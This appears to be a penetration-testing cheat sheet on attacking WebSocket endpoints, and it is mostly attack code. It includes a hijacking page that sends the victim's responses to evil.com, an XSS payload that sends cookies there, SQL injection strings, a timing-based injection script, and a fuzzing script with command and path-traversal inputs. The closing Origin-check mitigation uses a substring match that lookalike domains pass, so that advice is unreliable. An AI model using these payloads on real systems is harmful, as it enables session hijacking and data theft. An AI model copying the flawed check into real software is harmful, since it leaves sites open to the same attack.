# WebSocket Hijacking and Injection

Exploiting WebSocket connections for Cross-Site WebSocket Hijacking (CSWSH) and injection attacks.

## Cross-Site WebSocket Hijacking (CSWSH)

If a WebSocket endpoint doesn't validate the Origin header, an attacker can open a WS connection from a malicious page using the victim's cookies.

### Vulnerable Server

```javascript
// Node.js ws server - no Origin check
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });
wss.on('connection', (ws, req) => {
    // No Origin validation!
    // Uses session cookie from req.headers.cookie
    ws.on('message', (msg) => {
        // Process with victim's privileges
    });
});
```

### Exploit Payload

```html
<!-- Host on https://evil.com -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    // Send command as victim
    ws.send(JSON.stringify({action: 'getProfile'}));
};
ws.onmessage = function(e) {
    // Exfiltrate response
    fetch('https://evil.com/log?data=' + btoa(e.data));
};
</script>
```

## WebSocket Injection

### SQL Injection via WebSocket

```javascript
// If server passes WS messages to DB
ws.send('{"user": "admin' OR 1=1--"}');
```

```python
# Blind SQLi via WebSocket timing
import asyncio
import websockets
import time

async def test_sqli():
    async with websockets.connect('wss://target.com/ws') as ws:
        payload = '{"user": "admin' AND SLEEP(5)-- -"}'
        start = time.time()
        await ws.send(payload)
        await ws.recv()
        if time.time() - start > 5:
            print("[+] SQLi confirmed via WebSocket")

asyncio.run(test_sqli())
```

### XSS via WebSocket

```javascript
// Server echoes messages to other clients
ws.send('<img src=x onerror=fetch("https://evil.com/"+document.cookie)>')
```

## Fuzzing WebSockets

```python
import asyncio
import websockets
import json

async def fuzz():
    async with websockets.connect('wss://target.com/ws') as ws:
        payloads = [
            '{"action": "admin"}',
            '{"action": "debug"}',
            '{"action": "execute", "cmd": "id"}',
            "'; DROP TABLE users;--",
            '{{7*7}}',
            '../../../etc/passwd',
        ]
        for p in payloads:
            await ws.send(p)
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=3)
                print(f"[{p}] -> {resp[:200]}")
            except asyncio.TimeoutError:
                print(f"[{p}] -> TIMEOUT")

asyncio.run(fuzz())
```

## Detection

```bash
# Find WebSocket endpoints with ffuf
ffuf -w ws-endpoints.txt -u 'https://target.com/FUZZ'   -H "Upgrade: websocket"   -H "Connection: Upgrade"   -mc 101

# Burp Suite: Proxy > WebSocket history
# Chrome DevTools: Network > WS filter
```

## Mitigation

```javascript
// Validate Origin header
wss.on('connection', (ws, req) => {
    const origin = req.headers.origin;
    if (!origin || !origin.includes('target.com')) {
        ws.close(1008, 'Origin not allowed');
        return;
    }
    // ... proceed
});
```

- Always validate Origin header
- Use CSRF tokens for WebSocket handshake
- Sanitize all WebSocket message input
- Implement rate limiting
- Use `Sec-WebSocket-Protocol` for auth
